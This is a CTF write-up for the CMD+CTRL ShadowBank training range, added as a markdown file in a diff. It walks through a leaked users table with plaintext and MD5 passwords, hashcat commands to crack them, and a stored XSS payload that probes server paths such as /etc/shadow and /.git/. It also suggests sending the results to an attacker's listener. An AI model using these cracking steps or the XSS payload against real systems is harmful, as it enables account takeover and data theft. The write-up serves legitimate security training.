@@ -1,0 +1,127 @@
+---
+title: "CMD+CTRL Cyber Range: ShadowBank Web Challenge"
+date: 2025-06-27
+description: "Walkthrough of CMD+CTRL ShadowBank — exposed credentials, weak MD5 hashing, and a stored XSS payload to enumerate server paths."
+pageType: writeup
+tags: ["ctf"]
+draft: false
+---
+
+[CMD+CTRL Cyber Range](https://cmdctrl.net/) by Security Innovation is a gamified web CTF where you're dropped into a realistic-looking vulnerable application and rack up points by finding and exploiting bugs. ShadowBank is one of their scenarios — a fictional online bank with a laundry list of intentional flaws waiting to be found.
+
+## Exposed Database Dump
+
+The first meaningful find was a database dump reachable through an unauthenticated path on the app. The `users` table was sitting there in plaintext:
+
+```
+username    password                          salt
+shadow      a326311e36651f79b0dcd4dcda70228e  abc123
+dt          a441649fbaf4e42c513a4572f3db7e1e  abc123
+pants       4b8f105f370310ddc137d141d350cf12  as807135%#
+bither      0d107d09f5bbe40cade3de5c71e9e9b7
+peappend    b0f5b5df7fa2bb54e046d4287a0757ca
+tiger       827ccb0eea8a706c4c34a16891f84e7b
+boots       5ebe2294ecd0e0f08eab7690d2a6ee69
+arnold      asdgawegh
+test        addd03df13dc513f55ac3baa35fec7a5
+loans       hahanopassword
+viggy       nopass
+...
+ZAP         903a98d709fa4683aaaa036b84c125a6
+```
+
+A few things stand out immediately:
+
+- **arnold, loans, viggy** — the `password` column contains plaintext strings. No hashing at all for these accounts.
+- **bither, tiger, boots** — unsalted MD5. `0d107d09f5bbe40cade3de5c71e9e9b7`, `827ccb0eea8a706c4c34a16891f84e7b`, and `5ebe2294ecd0e0f08eab7690d2a6ee69` are all in rainbow tables (`letmein`, `12345`, `secret` respectively — hash any of those and you'll match instantly).
+- **shadow, dt** — MD5 with a weak static salt (`abc123`). Better than nothing but the salt is exposed in the same table, so it just means you need to prepend/append it in your hashcat rule and run rockyou.
+- **pants** — MD5 with a stronger salt (`as807135%#`). Harder but hashcat can handle it with a rule.
+
+The practical upshot: most of these accounts are trivially crackable or just readable. You can log in as several users without running a single cracking job by using the plaintext ones directly.
+
+## Cracking the MD5 Hashes
+
+For the unsalted accounts, `hashcat` in mode 0 (raw MD5) with rockyou is all you need:
+
+```bash
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+hashcat -m 0 -a 0 hashes.txt rockyou.txt --show
+```
+
+For the salted ones, use mode 20 (MD5 with salt appended) or 10 (salt prepended) depending on how the app constructs the hash — try both if one produces no hits:
+
+```bash
+# salt appended: MD5(password + salt)
+hashcat -m 20 -a 0 'a326311e36651f79b0dcd4dcda70228e:abc123' rockyou.txt
+
+# salt prepended: MD5(salt + password)
+hashcat -m 10 -a 0 'a326311e36651f79b0dcd4dcda70228e:abc123' rockyou.txt
+```
+
+The unsalted hashes crack in seconds. The weak-salt ones (`abc123`) also fall quickly — the salt provides no real protection when it's static and visible.
+
+## XSS — Stored Payload for Path Enumeration
+
+After getting into a few accounts, the next objective was finding further vulnerabilities. The app had a field that reflected user input back without sanitization — a classic stored XSS vector.
+
+The payload I injected was an HTML file that uses `fetch()` to probe a list of interesting server-side paths. Because `fetch()` goes to the same origin, when an admin or another user loads the page containing the injected content, their browser silently requests each path and reports back the HTTP status:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Directory Lister</title>
+  <style>body { font-family: monospace; background: #111; color: #0f0; }</style>
+</head>
+<body>
+  <h2>📂 Probing Common Paths...</h2>
+  <ul id="results"></ul>
+  <script>
+    const paths = [
+      "/etc/passwd",
+      "/etc/shadow",
+      "/etc/hosts",
+      "/etc/group",
+      "/flags.txt",
+      "/admin/",
+      "/.git/",
+      "/robots.txt",
+      "/config.php",
+      "/WEB-INF/web.xml",
+      "/ShadowBank/js/snake.js",
+      "/ShadowBank/../flag",
+    ];
+
+    const result = document.getElementById("results");
+
+    paths.forEach(path => {
+      fetch(path).then(res => {
+        const li = document.createElement("li");
+        li.textContent = `${res.status} — ${path}`;
+        li.style.color = res.ok ? "lime" : "gray";
+        result.appendChild(li);
+      }).catch(err => {
+        const li = document.createElement("li");
+        li.textContent = `ERR — ${path}`;
+        li.style.color = "red";
+        result.appendChild(li);
+      });
+    });
+  </script>
+</body>
+</html>
+```
+
+Any path that returns a `200` lights up in green. From here you know which resources exist and can fetch their contents with a follow-up `fetch(path).then(r => r.text())` call exfiltrated to a listener you control.
+
+Worth noting: this approach only works because the XSS is same-origin — the `fetch()` calls bypass the browser's CORS restrictions since the request goes to the app's own domain. If the interesting paths were on a different origin you'd need a different exfiltration strategy (e.g., DNS exfil or a `no-cors` image tag trick).
+
+## Takeaways
+
+The ShadowBank scenario packs a realistic mix of vulnerabilities you still find in production apps:
+
+- Exposed database files accessible without authentication
+- A mix of plaintext and weakly hashed passwords in the same table (suggests the app grew organically and password storage was never standardized)
+- Stored XSS in a field that probably "just shows text" to whoever built it
+
+The hash-cracking step is a good reminder that MD5 without a strong, per-user salt is effectively plaintext for any attacker with a GPU and rockyou — and that a salt exposed in the same table it's protecting doesn't actually help.
